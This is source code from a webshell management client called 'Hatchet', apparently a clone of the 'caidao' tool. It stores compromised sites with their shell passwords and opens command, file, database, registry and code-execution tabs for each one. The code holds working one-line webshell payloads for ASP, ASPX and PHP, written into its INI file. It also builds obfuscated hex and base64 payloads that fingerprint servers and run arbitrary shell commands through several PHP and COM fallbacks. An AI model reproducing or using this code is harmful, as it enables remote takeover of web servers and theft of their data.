	pMydb->Execute("UPDATE [SiteTable] SET [IP] ='"+ HosttoIP( szGlobal_SiteUrl ) +"',[NewTime] = NOW() where [ID]="+szUpdataIP);

	CMainHatchet* pMainHatchet = (CMainHatchet*)AfxGetMainWnd();
	pMainHatchet->AddFileTab();
}

void CMainDlg::AddCmdTab()																				//CMD管理
{
	if (pCaptionCenterPanel->m_hWnd == NULL) return;

	int nList = m_sitelist.GetNextItem(-1,LVNI_SELECTED);
	if (nList < 0) return;//修正获取列表框数据的小问题。

	SiteData* pDataInfo = (SiteData*)m_sitelist.GetItemData(nList);
	szGlobal_SiteUrl	= m_sitelist.GetItemText(nList,0);
	szGlobal_SiteJoinUrl	= m_sitelist.GetItemText(nList,4);
	szGlobal_SitePass	= m_sitelist.GetItemText(nList,1);
	nGlobal_SiteCode	= pDataInfo->nCodePage;
	nGlobal_SiteScript	= pDataInfo->nScript;

	CString szUpdataIP;
	szUpdataIP.Format("%d", pDataInfo->ID);
	pMydb->Execute("UPDATE [SiteTable] SET [IP] ='"+ HosttoIP( szGlobal_SiteUrl ) +"',[NewTime] = NOW() where [ID]="+szUpdataIP);

	CMainHatchet* pMainHatchet = (CMainHatchet*)AfxGetMainWnd();
	pMainHatchet->AddCmdTab();
}

void CMainDlg::AddDataTab()																				//数据库管理
{
	if (pCaptionCenterPanel->m_hWnd == NULL) return;

	int nList = m_sitelist.GetNextItem(-1,LVNI_SELECTED);
	if (nList < 0) return;//修正获取列表框数据的小问题。

	SiteData* pDataInfo = (SiteData*)m_sitelist.GetItemData(nList);
	szGlobal_SiteUrl = m_sitelist.GetItemText(nList,0);
	szGlobal_SitePass = m_sitelist.GetItemText(nList,1);
	szGlobal_SiteConfig = m_sitelist.GetItemText(nList,2);
	nGlobal_SiteCode	= pDataInfo->nCodePage;
	nGlobal_SiteScript	= pDataInfo->nScript;

	CString szUpdataIP;
	szUpdataIP.Format("%d", pDataInfo->ID);
	pMydb->Execute("UPDATE [SiteTable] SET [IP] ='"+ HosttoIP( szGlobal_SiteUrl ) +"',[NewTime] = NOW() where [ID]="+szUpdataIP);

	CMainHatchet* pMainHatchet = (CMainHatchet*)AfxGetMainWnd();
	pMainHatchet->AddDataTab();
}

void CMainDlg::AddProxyTab()																				//代理管理
{
	if (pCaptionCenterPanel->m_hWnd == NULL) return;

	int nList = m_sitelist.GetNextItem(-1,LVNI_SELECTED);
	if (nList < 0) return;//修正获取列表框数据的小问题。

	SiteData* pDataInfo = (SiteData*)m_sitelist.GetItemData(nList);
	szGlobal_SiteUrl = m_sitelist.GetItemText(nList,0);
	szGlobal_SitePass = m_sitelist.GetItemText(nList,1);
	nGlobal_SiteCode	= pDataInfo->nCodePage;
	nGlobal_SiteScript	= pDataInfo->nScript;

	if (nGlobal_SiteScript != 3)
	{
		AfxMessageBox("Software is improving!");
		m_sitelist.SetFocus();
		return;
	}

	CString szUpdataIP;
	szUpdataIP.Format("%d", pDataInfo->ID);
	pMydb->Execute("UPDATE [SiteTable] SET [IP] ='"+ HosttoIP( szGlobal_SiteUrl ) +"',[NewTime] = NOW() where [ID]="+szUpdataIP);

	CMainHatchet* pMainHatchet = (CMainHatchet*)AfxGetMainWnd();
	pMainHatchet->AddProxyTab();
}

//////////////////////////////////////////////////////////////////////////
void CMainDlg::OnNMClickTypetree(NMHDR *pNMHDR, LRESULT *pResult)				//TypeTree 单击
{
	*pResult = 0;
}

void CMainDlg::OnHatchetTypeAdd()						//类型添加
{
	//AfxMessageBox("类型添加");
	nHatchetTypeAdd_Edit = 1;
	select_ht = m_typetree.InsertItem("", m_typetree.GetRootItem());//新加的 == 选择的
	m_typetree.EditLabel(select_ht);
}


void CMainDlg::OnHatchetTypeEdit()						//类型编辑
{
	if ( m_typetree.GetChildItem(select_ht) == NULL)				//判断根
	{
		nHatchetTypeAdd_Edit = 2;
		m_typetree.SelectItem(select_ht);		//设置选中
		m_typetree.EditLabel(select_ht);
	}
}


void CMainDlg::OnHatchetTypeDel()						//类型删除
{
	if ( m_typetree.GetChildItem(select_ht) == NULL)				//判断根
	{
		CString szSelectText = m_typetree.GetItemText(select_ht);
		szSelectText.Replace("'", "''");
		MydbArray.RemoveAll();
		pMydb->Select("SELECT [ID] FROM [Type] Where [TypeName]='"+ szSelectText +"'", MydbArray);
		if (MydbArray.GetAt(0) == "1")//默认不能删除
		{
			AfxMessageBox("You can not delete the default");
		}else{
			//判断里面有没有shell
			pMydb->Select("SELECT [ID] FROM [SiteTable] Where [nType]="+ MydbArray.GetAt(0), MydbArray);
			if (MydbArray.GetCount() > 0)
			{
				AfxMessageBox("Please remove this type of shell");
			}else{
				if ( pMydb->Execute("Delete FROM [Type] Where [TypeName]='"+ szSelectText +"'") )
				{
					m_typetree.DeleteItem(select_ht);
					m_edit.SetWindowText( "Type "+ szSelectText +" delete completed" );					//设置状态栏
				}
			}
		}
	}
	m_typetree.SetFocus();
}
void CMainDlg::OnTvnEndlabeleditTypetree(NMHDR *pNMHDR, LRESULT *pResult)		//TypeTree 编辑完成
{
	LPNMTVDISPINFO pTVDispInfo = reinterpret_cast<LPNMTVDISPINFO>(pNMHDR);
	// TODO: 在此添加控件通知处理程序代码
	CEdit*   pedt = m_typetree.GetEditControl();
	CString temp="";
	if (pedt)
	{
		pedt->GetWindowText(temp);
	}

	if (nHatchetTypeAdd_Edit == 1)//如果添加，你竟然没有输入，那么删除掉
	{
		nHatchetTypeAdd_Edit = -1;
		if (temp == "")
		{
			m_typetree.DeleteItem(select_ht);
		}else{
			//AfxMessageBox("添加成功: "+ temp);
			//////////////////////////////////////////////////////////////////////////
			temp.Replace("'", "''");
			MydbArray.RemoveAll();
			pMydb->Select("SELECT [TypeName] FROM [Type] Where [TypeName]='"+ temp +"'", MydbArray);
			if (MydbArray.GetCount() > 0)
			{
				AfxMessageBox("Already exists");
			}else{
				if ( pMydb->Execute("INSERT INTO Type (nParent,TypeName) VALUES ('0','"+ temp +"')") )
				{
					pedt->GetWindowText(temp);
					m_typetree.SetItemText(select_ht, temp);
					m_edit.SetWindowText( "Type "+ temp +" add completed" );					//设置状态栏
				}
			}
			//////////////////////////////////////////////////////////////////////////
		}
	}else if (nHatchetTypeAdd_Edit == 2)
	{
		nHatchetTypeAdd_Edit = -1;
		if (temp == "")
		{
			//不能为空
		}else{
			//AfxMessageBox(m_typetree.GetItemText(select_ht));
			//AfxMessageBox("编辑成功: "+ temp);
			//////////////////////////////////////////////////////////////////////////
			if (temp != m_typetree.GetItemText(select_ht))						//跟原来一样，不需要进数据库更新
			{
				temp.Replace("'", "''");
				MydbArray.RemoveAll();
				pMydb->Select("SELECT [TypeName] FROM [Type] Where [TypeName]='"+ temp +"'", MydbArray);
				if (MydbArray.GetCount() > 0)
				{
					AfxMessageBox("Already exists");
				}else{
					CString szSelectText = m_typetree.GetItemText(select_ht);
					szSelectText.Replace("'", "''");
					if ( pMydb->Execute("UPDATE [Type] SET [TypeName] ='"+ temp +"' Where [TypeName]='"+ szSelectText +"'") )
					{
						pedt->GetWindowText(temp);
						m_typetree.SetItemText(select_ht, temp);
						m_edit.SetWindowText( "Type "+ temp +" update completed" );					//设置状态栏
					}
				}
			}
			//////////////////////////////////////////////////////////////////////////*/
		}
	}

	*pResult = 0;
}


void CMainDlg::AddEvalCodeTab()																				//代码执行
{
	if (pCaptionCenterPanel->m_hWnd == NULL) return;

	int nList = m_sitelist.GetNextItem(-1,LVNI_SELECTED);
	if (nList < 0) return;//修正获取列表框数据的小问题。

	SiteData* pDataInfo = (SiteData*)m_sitelist.GetItemData(nList);
	szGlobal_SiteUrl = m_sitelist.GetItemText(nList,0);
	szGlobal_SiteJoinUrl	= m_sitelist.GetItemText(nList,4);
	szGlobal_SitePass = m_sitelist.GetItemText(nList,1);
	nGlobal_SiteCode	= pDataInfo->nCodePage;
	nGlobal_SiteScript	= pDataInfo->nScript;

	if (nGlobal_SiteScript == 4)
	{
		AfxMessageBox("Software is improving!");
		m_sitelist.SetFocus();
		return;
	}

	CString szUpdataIP;
	szUpdataIP.Format("%d", pDataInfo->ID);
	pMydb->Execute("UPDATE [SiteTable] SET [IP] ='"+ HosttoIP( szGlobal_SiteUrl ) +"',[NewTime] = NOW() where [ID]="+szUpdataIP);

	CMainHatchet* pMainHatchet = (CMainHatchet*)AfxGetMainWnd();
	pMainHatchet->AddEvalCodeTab();
}

void CMainDlg::AddRegistryTab()																				//注册表管理
{
	if (pCaptionCenterPanel->m_hWnd == NULL) return;

	int nList = m_sitelist.GetNextItem(-1,LVNI_SELECTED);
	if (nList < 0) return;//修正获取列表框数据的小问题。

	SiteData* pDataInfo = (SiteData*)m_sitelist.GetItemData(nList);
	szGlobal_SiteUrl = m_sitelist.GetItemText(nList,0);
	szGlobal_SitePass = m_sitelist.GetItemText(nList,1);
	nGlobal_SiteCode	= pDataInfo->nCodePage;
	nGlobal_SiteScript	= pDataInfo->nScript;

	CString szUpdataIP;
	szUpdataIP.Format("%d", pDataInfo->ID);
	pMydb->Execute("UPDATE [SiteTable] SET [IP] ='"+ HosttoIP( szGlobal_SiteUrl ) +"',[NewTime] = NOW() where [ID]="+szUpdataIP);

	CMainHatchet* pMainHatchet = (CMainHatchet*)AfxGetMainWnd();
	pMainHatchet->AddRegistryTab();
}

void CMainDlg::AddBrowseTab()																				//浏览器
{
	if (pCaptionCenterPanel->m_hWnd == NULL) return;

	int nList = m_sitelist.GetNextItem(-1,LVNI_SELECTED);
	if (nList < 0) return;//修正获取列表框数据的小问题。

	SiteData* pDataInfo = (SiteData*)m_sitelist.GetItemData(nList);
	szGlobal_SiteUrl = m_sitelist.GetItemText(nList,0);

	CMainHatchet* pMainHatchet = (CMainHatchet*)AfxGetMainWnd();
	pMainHatchet->AddBrowseTab();
}


void CMainDlg::OnMainSiteUpdateIni()				//更新配置 1
{
	OnMainUpdateIni(false);
	OnMainUpdatePost();
}
void CMainDlg::OnMainSite2UpdateIni()				//更新配置 2
{
	OnMainUpdateIni(false);
	OnMainUpdatePost();
}

void CMainDlg::OnMainUpdateIni(bool bNoCreat)					//更新配置
{
	szGlobal_RandType.RemoveAll();
	szGlobal_RandTypeExclude.RemoveAll();

	szGlobal_RandType.Add("article");
	szGlobal_RandType.Add("news");
	szGlobal_RandType.Add("type");
	szGlobal_RandType.Add("index");
	szGlobal_RandType.Add("view");

	CString temp="",temp2="";
	int posX,posY;
	CStdioFile pFile;
	if( pFile.Open("Hatchet.ini",CFile::modeRead) == FALSE )
	{
		if (!bNoCreat)		//打开菜刀，加载配置。第一次不要加载ini配置
		{
			if( pFile.Open("Hatchet.ini",CFile::modeCreate|CFile::modeWrite) )
			{
				pFile.WriteString(
					"[Header]\n"
					"User-Agent=Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\n"
					"Referer=1\n"
					"X-Forwarded-For=1\n"
					"[/Header]\n"
					"[Headers]\n"
					"Accept-Language: en-us\n"
					"Content-Type: application/x-www-form-urlencoded\n"
					"[/Headers]\n"
					"[POST]\n"
					"ASP_POST_DATA==Execute(\"Execute(\"\"On+Error+Resume+Next:Response.Clear:\n\n"
					"ASPX_POST_DATA==Response.Write(\"->|\");var err:Exception;try{eval(System.Text.Encoding.GetEncoding(%nPageCode%).GetString(System.Convert.FromBase64String(\"%szBase64EvalCode%\")),\"unsafe\");}catch(err){Response.Write(\"ERROR:// \"%2Berr.message);}Response.Write(\"|<-\");Response.End();\n\n"
					"PHP_POST_DATA==@eval(base64_decode($_POST[z0]));&z0=\n\n"
					"PHP_POST_Z0_DATA=@ini_set(\"display_errors\",\"0\");@set_time_limit(0);@set_magic_quotes_runtime(0);\n"
					"[/POST]\n"
					"[RandTypeExclude]\n"
					"127.0.0.1\n"
					"[/RandTypeExclude]\n"
					"[RandType]\n"
					"article\n"
					"news\n"
					"type\n"
					"index\n"
					"view\n"
					"[/RandType]\n"
					);
				pFile.Close();
				m_edit.SetWindowText("INI Created");					//设置状态栏
			}
		}
	}else{
		szGlobal_RandType.RemoveAll();
		bool bIsRandType = false;
		bool bIsRandTypeExclude = false;

		while(pFile.ReadString(temp2))
		{
			if (!bIsRandType && temp2.Find("[RandType]") != -1)
			{
				bIsRandType = true;
			}else if (!bIsRandTypeExclude && temp2.Find("[RandTypeExclude]") != -1)
			{
				bIsRandTypeExclude = true;
			}


			if ( bIsRandType )
			{
				if (temp2 == "[/RandType]")
				{
					bIsRandType = false;
				}
				if (temp2 != "[RandType]" && temp2 != "[/RandType]" && temp2 != "")
				{
					szGlobal_RandType.Add( temp2 );
				}
			}else if ( bIsRandTypeExclude )
			{
				if (temp2 == "[/RandTypeExclude]")
				{
					bIsRandTypeExclude = false;
				}
				if (temp2 != "[RandTypeExclude]" && temp2 != "[/RandTypeExclude]" && temp2 != "")
				{
					szGlobal_RandTypeExclude.Add( temp2 );
				}
			}else{
				temp += temp2 + "\r\n";
			}			
		}
		pFile.Close();

		posX = temp.Find("[Header]");
		if(posX == -1) return;
		posY = temp.Find("[/Header]", posX+1);
		if(posY == -1) return;

		temp2 = temp.Mid(posX, posY-posX);

		posX = temp2.Find("User-Agent=");
		posY = temp2.Find("\r\n", posX);
		Ini_szUser_Agent = temp2.Mid(posX+11, posY-posX-11);
		Ini_szUser_Agent.TrimLeft();
		Ini_szUser_Agent.TrimRight();

		posX = temp2.Find("Referer=");
		if (temp2.Mid(posX+8, 1) == "1")
		{
			Ini_bReferer = true;
		}else{
			Ini_bReferer = false;
		}

		posX = temp2.Find("X-Forwarded-For=");
		if (temp2.Mid(posX+16, 1) == "1")
		{
			Ini_bX_Forwarded_For = true;
		}else{
			Ini_bX_Forwarded_For = false;
		}
		//////////////////////////////////////////////////////////////////////////
		posX = temp.Find("[Headers]");
		if(posX == -1) return;
		posY = temp.Find("[/Headers]", posX+1);
		if(posY == -1) return;

		temp2 = temp.Mid(posX+11, posY-posX-11);

		Ini_szHeaders = temp2;
		//////////////////////////////////////////////////////////////////////////
		posX = temp.Find("[POST]");
		if(posX == -1) return;
		posY = temp.Find("[/POST]", posX+1);
		if(posY == -1) return;

		temp2 = temp.Mid(posX+8, posY-posX-8);

		posX = temp2.Find("ASP_POST_DATA=");
		posY = temp2.Find("\r\n", posX);
		if (posX != -1 && posY != -1)
		{
			Ini_szASP_POST_DATA = temp2.Mid(posX+14, posY-posX-14);
			Ini_szASP_POST_DATA.TrimLeft();
			Ini_szASP_POST_DATA.TrimRight();
		}

		posX = temp2.Find("ASPX_POST_DATA=");
		posY = temp2.Find("\r\n", posX);
		if (posX != -1 && posY != -1)
		{
			Ini_szASPX_POST_DATA = temp2.Mid(posX+15, posY-posX-15);
			Ini_szASPX_POST_DATA.TrimLeft();
			Ini_szASPX_POST_DATA.TrimRight();
		}

		posX = temp2.Find("PHP_POST_DATA=");
		posY = temp2.Find("\r\n", posX);
		if (posX != -1 && posY != -1)
		{
			Ini_szPHP_POST_DATA = temp2.Mid(posX+14, posY-posX-14);
			Ini_szPHP_POST_DATA.TrimLeft();
			Ini_szPHP_POST_DATA.TrimRight();
		}

		posX = temp2.Find("PHP_POST_Z0_DATA=");
		posY = temp2.Find("\r\n", posX);
		if (posX != -1 && posY != -1)
		{
			Ini_szPHP_POST_Z0_DATA = temp2.Mid(posX+17, posY-posX-17);
			Ini_szPHP_POST_Z0_DATA.TrimLeft();
			Ini_szPHP_POST_Z0_DATA.TrimRight();
		}
		//////////////////////////////////////////////////////////////////////////
		m_edit.SetWindowText( "Has been updated" );					//设置状态栏
	}
}


void CMainDlg::OnLvnColumnclickSitelist(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMLISTVIEW pNMLV = reinterpret_cast<LPNMLISTVIEW>(pNMHDR);

	CString szSort;
	CString szDesc_Asc;

	switch(pNMLV->iSubItem)
	{
	case 0:
		szSort = "SiteUrl";
		break;
	case 1:
		szSort = "SitePass";
		break;
	case 2:
		szSort = "Config";
		break;
	case 3:
		szSort = "IP";
		break;
	case 4:
		szSort = "JoinUrl";
		break;
	case 5:
		szSort = "NewTime";
		break;
	case 6:
		szSort = "AddTime";
		break;
	default:
		szSort = "SiteUrl";
		break;
	}
	if (szSort_Desc_Asc == "Desc")
	{
		szDesc_Asc = "Asc";
	}else{
		szDesc_Asc = "Desc";
	}
	ShowSiteList(szSort_TypeName, szSort_Find, szSort, szDesc_Asc);

	*pResult = 0;
}

void CMainDlg::OnMainUpdatePost()
{
	/////////////////////////////////////////////////////////////////////////////////////////////////////////////								初始化
	szCmdGetInfo[0] =	Ini_szASP_POST_DATA + "Function+bd%28byVal+s%29%3AFor+i%3D1+To+Len%28s%29+Step+"
		"2%3Ac%3DMid%28s%2Ci%2C2%29%3AIf+IsNumeric%28Mid%28s%2Ci%2C1%29%29+Then%3AExecute%28%22%22%22%22bd%3D"
		"bd%26chr%%28%26H%22%22%22%22%26c%26%22%22%22%22%29%22%22%22%22%29%3AElse%3AExecute%28%22%22%22%22bd%3"
		"Dbd%26chr%%28%26H%22%22%22%22%26c%26Mid%28s%2Ci%2B2%2C2%29%26%22%22%22%22%29%22%22%22%22%29%3Ai%3Di%2"
		"B2%3AEnd+If%22%22%26chr%%2810%29%26%22%22Next%3AEnd+Function:Response.Write(\"\"\"\"->|\"\"\"\"):Exec"
		"ute(\"\"\"\"On+Error+Resume+Next:\"\"\"\"%26bd(\"\"\"\"44696D20533A533D5365727665722E4D6170706174682"
		"8222E2229266368722839293A53455420433D4372656174654F626A6563742822536372697074696E672E46696C655379737"
		"4656D4F626A65637422293A496620457272205468656E3A4572722E436C6561723A456C73653A466F7220456163682044206"
		"96E20432E4472697665733A533D5326442E44726976654C657474657226636872283538293A4E6578743A456E642049663A5"
		"26573706F6E73652E5772697465285329\"\"\"\")):Response.Write(\"\"\"\"|<-\"\"\"\"):Response.End\"\")\")";

	szCmdGetInfo[1] =	Ini_szASPX_POST_DATA;
	szCmdGetInfo[1].Replace("%szBase64EvalCode%", "dmFyIGM9U3lzdGVtLklPLkRpcmVjdG9yeS5HZXRMb2dpY2FsRHJpdmVzKCk7UmVzcG9"
		"uc2UuV3JpdGUoU2VydmVyLk1hcFBhdGgoIi4iKSsiCSIpO2Zvcih2YXIgaT0wO2k8PWMubGVuZ3RoLTE7aSsrKVJlc3BvbnNlLld"
		"yaXRlKGNbaV1bMF0rIjoiKTs=");

	szCmdGetInfo[2] =	Ini_szPHP_POST_DATA + MyBase64Encode(-1, Ini_szPHP_POST_Z0_DATA + "echo('->|');"
		"$D=dirname($_SERVER['SCRIPT_FILENAME']);if($D=='')$D=dirname($_SERVER['PATH_TRANSLATED']);$R=\"{$D}\\t\";"
		"if(substr($D,0,1)!='/'){foreach(range('A','Z') as $L)if(is_dir(\"{$L}:\"))$R.=\"{$L}:\";}$R.=\"\\t\";"
		"$u=(function_exists('posix_getegid'))?@posix_getpwuid(@posix_geteuid()):'';$usr=($u)?$u['name']:@get_current_user();"
		"$R.=php_uname();$R.=\"({$usr})\";print $R;exit('|<-');");

	szCmdGetInfo[3] =	"";
	//////////////////////////////////////////////////////////////////////////
	szCmdGetExec[0] =	Ini_szASP_POST_DATA + "Function+bd%28byVal+s%29%3AFor+i%3D1+To+Len%28s%29+Step+"
		"2%3Ac%3DMid%28s%2Ci%2C2%29%3AIf+IsNumeric%28Mid%28s%2Ci%2C1%29%29+Then%3AExecute%28%22%22%22%22bd%3D"
		"bd%26chr%%28%26H%22%22%22%22%26c%26%22%22%22%22%29%22%22%22%22%29%3AElse%3AExecute%28%22%22%22%22bd%3"
		"Dbd%26chr%%28%26H%22%22%22%22%26c%26Mid%28s%2Ci%2B2%2C2%29%26%22%22%22%22%29%22%22%22%22%29%3Ai%3Di%2"
		"B2%3AEnd+If%22%22%26chr%%2810%29%26%22%22Next%3AEnd+Function:Response.Write(\"\"\"\"->|\"\"\"\"):Exec"
		"ute(\"\"\"\"On+Error+Resume+Next:\"\"\"\"%26bd(\"\"\"\"53657420583D4372656174654F626A656374282277736"
		"3726970742E7368656C6C22292E657865632822222222266264285265717565737428227A3122292926222222202F6320222"
		"222266264285265717565737428227A322229292622222222293A496620457272205468656E3A533D225B4572725D2022264"
		"572722E4465736372697074696F6E3A4572722E436C6561723A456C73653A4F3D582E5374644F75742E52656164416C6C282"
		"93A453D582E5374644572722E52656164416C6C28293A533D4F26453A456E642049663A526573706F6E73652E77726974652"
		"85329\"\"\"\")):Response.Write(\"\"\"\"|<-\"\"\"\"):Response.End\"\")\")";
	//z1=636D64&z2=6364202F642022433A5C5757575C2E5C222661266563686F205B535D266364266563686F205B455D
	//%63%64%20%2F%64%20%22%43%3A%5C%57%57%57%5C%2E%5C%22%26%77%68%6F%61%6D%69%26%65%63%68%6F%20%5B%53%5D%26%63%64%26%65%63%68%6F%20%5B%45%5D

	szCmdGetExec[1]	=	Ini_szASPX_POST_DATA;
	//z1=Y21k&z2=Y2QgL2QgIkM6XFdXV1wuXCImdmVyJmVjaG8gW1NdJmNkJmVjaG8gW0Vd
/*
	szCmdGetExec[2] =	Ini_szPHP_POST_DATA + "QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO"
		"0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskcD1iYXNlNjRfZGV"
		"jb2RlKCRfUE9TVFsiejEiXSk7JHM9YmFzZTY0X2RlY29kZSgkX1BPU1RbInoyIl0pOyRkPWRpcm5hbWUoJF9TRVJWRVJbIlNDUkl"
		"QVF9GSUxFTkFNRSJdKTskYz1zdWJzdHIoJGQsMCwxKT09Ii8iPyItYyBcInskc31cIiI6Ii9jIFwieyRzfVwiIjskcj0ieyRwfSB"
		"7JGN9IjtAc3lzdGVtKCRyLiIgMj4mMSIsJHJldCk7cHJpbnQgKCRyZXQhPTApPyIKcmV0PXskcmV0fQoiOiIiOztlY2hvKCJ8PC0"
		"iKTtkaWUoKTs%3D";//&z1=%s&z2=%s
*/
	/*
	szCmdGetExec[2] =	Ini_szPHP_POST_DATA + MyBase64Encode(-1, Ini_szPHP_POST_Z0_DATA + "echo(\"->|\");$p="
		"base64_decode($_POST[\"z1\"]);$s=base64_decode($_POST[\"z2\"]);$d=dirname($_SERVER[\"SCRIPT_FILENAME"
		"\"]);$c=substr($d,0,1)==\"/\"?\"-c \\\"{$s}\\\"\":\"/c \\\"{$s}\\\"\";$r=\"{$p} {$c}\";$ret=1;@system($r.\""
		" 2>&1\",$ret);if($ret!=0)@passthru($r.\" 2>&1\",$ret);if($ret!=0){$z=@shell_exec($r.\" 2>&1\");$ret="
		"trim($z)==\"\"?1:0;echo($z);}if($ret!=0){@exec($r.\" 2>&1\",$z,$res);echo($z=join(substr($d,0,1)==\""
		"/\"?\"\\n\":\"\\r\\n\",$z));}if($ret!=0&&substr($d,0,1)!=\"/\"&&class_exists('COM')){$w=new COM('WSc"
		"ript.shell');$e=$w->exec($r.\" 2>&1\");$f=$e->StdOut();$z=$f->ReadAll();$ret=trim($z)==\"\"?1:0;echo"
		"($z);}print ($ret!=0)?\"ret={$ret}\":\"\";exit(\"|<-\");");//&z1=%s&z2=%s
	*/
	szCmdGetExec[2] =	Ini_szPHP_POST_DATA + MyBase64Encode(-1, Ini_szPHP_POST_Z0_DATA + "echo('->|');"
		"$p=base64_decode($_POST[\"z1\"]);"
		"$s=base64_decode($_POST[\"z2\"]);"
		"$d=dirname($_SERVER[\"SCRIPT_FILENAME\"]);"
		"$c=substr($d,0,1)==\"/\"?\"-c \\\"{$s}\\\"\":\"/c \\\"{$s}\\\"\";"
		"$r=\"{$p} {$c}\";"
		"$ret=1;"
		"try{"
		"@system($r.' 2>&1',$ret);"
		"if($ret!=0)@passthru($r.' 2>&1',$ret);"
		"if($ret!=0){$z=@shell_exec($r.' 2>&1');$ret=(trim($z)=='')?1:0;echo($z);}"
		"if($ret!=0){@exec($r.' 2>&1',$z,$ret);echo($z=join(substr($d,0,1)=='/'?\"\\n\":\"\\r\\n\",$z));}"
		"if($ret!=0){"
		"$a=array(array('pipe','r'),array('pipe','w'),array('pipe','w'));"
		"$fp=@proc_open($r.' 2>&1',$a,$pi);"
		"$z=stream_get_contents($pi[1]);"
		"$ret=(trim($z)=='')?1:0;echo($z);"
		"@proc_close($fp);"
		"}"
		"if($ret!=0){"
		"if(($fp=@popen($r.' 2>&1','r'))!=FALSE){"
		"$z='';while(!feof($fp)){$z.=fgets($fp);}"
		"$ret=(trim($z)=='')?1:0;"
		"echo($z);"
		"@pclose($fp);"
		"}}"
		"if($ret!=0&&substr($d,0,1)!=\"/\"&&class_exists('COM'))"
		"{$w=new COM('WScript.shell');$m=$w->exec($r.' 2>&1');$f=$m->StdOut();$z=$f->ReadAll();$ret=(trim($z)=='')?1:0;echo($z);}"
		"}catch(Exception $e){"
		"echo ' Message: '.$e->getMessage();"
		"}"
		"print ($ret!=0)?\"ret={$ret}\":'';"
		"exit('|<-');");//&z1=%s&z2=%s

	szCmdGetExec[3]	=	"";
	//////////////////////////////////////////////////////////////////////////															以上 CMD OK
	szFileGetInfo[0] =	Ini_szASP_POST_DATA + "Function+bd%28byVal+s%29%3AFor+i%3D1+To+Len%28s%29+Step+"
		"2%3Ac%3DMid%28s%2Ci%2C2%29%3AIf+IsNumeric%28Mid%28s%2Ci%2C1%29%29+Then%3AExecute%28%22%22%22%22bd%3D"
		"bd%26chr%%28%26H%22%22%22%22%26c%26%22%22%22%22%29%22%22%22%22%29%3AElse%3AExecute%28%22%22%22%22bd%3"
		"Dbd%26chr%%28%26H%22%22%22%22%26c%26Mid%28s%2Ci%2B2%2C2%29%26%22%22%22%22%29%22%22%22%22%29%3Ai%3Di%2"
		"B2%3AEnd+If%22%22%26chr%%2810%29%26%22%22Next%3AEnd+Function:Response.Write(\"\"\"\"->|\"\"\"\"):Exec"
		"ute(\"\"\"\"On+Error+Resume+Next:\"\"\"\"%26bd(\"\"\"\"44696D20533A533D5365727665722E4D6170706174682"
		"8222E2229266368722839293A53455420433D4372656174654F626A6563742822536372697074696E672E46696C655379737"
		"4656D4F626A65637422293A496620457272205468656E3A4572722E436C6561723A456C73653A466F7220456163682044206"
		"96E20432E4472697665733A533D5326442E44726976654C657474657226636872283538293A4E6578743A456E642049663A5"
		"26573706F6E73652E5772697465285329\"\"\"\")):Response.Write(\"\"\"\"|<-\"\"\"\"):Response.End\"\")\")";

	szFileGetInfo[1] =	Ini_szASPX_POST_DATA;
	szFileGetInfo[1].Replace("%szBase64EvalCode%", "dmFyIGM9U3lzdGVtLklPLkRpcmVjdG9yeS5HZXRMb2dpY2FsRHJpdmVzKCk7UmVzcG"
		"9uc2UuV3JpdGUoU2VydmVyLk1hcFBhdGgoIi4iKSsiCSIpO2Zvcih2YXIgaT0wO2k8PWMubGVuZ3RoLTE7aSsrKVJlc3BvbnNlLl"
		"dyaXRlKGNbaV1bMF0rIjoiKTs%3D");

	szFileGetInfo[2] =	Ini_szPHP_POST_DATA + MyBase64Encode(-1, Ini_szPHP_POST_Z0_DATA + "echo(\"->|\");;$D"
		"=dirname($_SERVER[\"SCRIPT_FILENAME\"]);if($D==\"\")$D=dirname($_SERVER[\"PATH_TRANSLATED\"]);$R=\"{"
		"$D}\\t\";if(substr($D,0,1)!=\"/\"){foreach(range(\"A\",\"Z\") as $L)if(is_dir(\"{$L}:\"))$R.=\"{$L}:"
		"\";}$R.=\"\\t\";$u=(function_exists('posix_getegid'))?@posix_getpwuid(@posix_geteuid()):'';$usr=($u)"
		"?$u['name']:@get_current_user();$R.=php_uname();$R.=\"({$usr})\";print $R;;echo(\"|<-\");die();");
	szFileGetInfo[3] =	"";
	//////////////////////////////////////////////////////////////////////////															文件管理 信息
	szFileGetFiles[0] =	Ini_szASP_POST_DATA + "Function+bd%28byVal+s%29%3AFor+i%3D1+To+Len%28s%29+Step+"
		"2%3Ac%3DMid%28s%2Ci%2C2%29%3AIf+IsNumeric%28Mid%28s%2Ci%2C1%29%29+Then%3AExecute%28%22%22%22%22bd%3D"
		"bd%26chr%%28%26H%22%22%22%22%26c%26%22%22%22%22%29%22%22%22%22%29%3AElse%3AExecute%28%22%22%22%22bd%3"
		"Dbd%26chr%%28%26H%22%22%22%22%26c%26Mid%28s%2Ci%2B2%2C2%29%26%22%22%22%22%29%22%22%22%22%29%3Ai%3Di%2"
		"B2%3AEnd+If%22%22%26chr%%2810%29%26%22%22Next%3AEnd+Function:Response.Write(\"\"\"\"->|\"\"\"\"):Exec"
		"ute(\"\"\"\"On+Error+Resume+Next:\"\"\"\"%26bd(\"\"\"\"44696D2052523A52523D6264285265717565737428227"
		"A312229293A46756E6374696F6E204644286474293A46443D596561722864742926222D223A4966204C656E284D6F6E74682"
		"8647429293D31205468656E3A4644203D204644262230223A456E642049663A46443D4644264D6F6E74682864742926222D2"
		"23A4966204C656E2844617928647429293D31205468656E3A46443D4644262230223A456E642049663A46443D46442644617"
		"9286474292622202226466F726D61744461746554696D652864742C342926223A223A4966204C656E285365636F6E6428647"
		"429293D31205468656E3A46443D4644262230223A456E642049663A46443D4644265365636F6E64286474293A456E6420467"
		"56E6374696F6E3A53455420433D4372656174654F626A6563742822536372697074696E672E46696C6553797374656D4F626"
		"A65637422293A53657420464F3D432E476574466F6C646572282222265252262222293A496620457272205468656E3A52657"
		"3706F6E73652E577269746528224552524F523A2F2F2022264572722E4465736372697074696F6E293A4572722E436C65617"
		"23A456C73653A466F722045616368204620696E20464F2E737562666F6C646572733A526573706F6E73652E5772697465204"
		"62E4E616D6526636872283437292663687228392926464428462E446174654C6173744D6F646966696564292663687228392"
		"926636872283438292663687228392926432E476574466F6C64657228462E50617468292E617474726962757465732663687"
		"2283130293A4E6578743A466F722045616368204C20696E20464F2E66696C65733A526573706F6E73652E5772697465204C2"
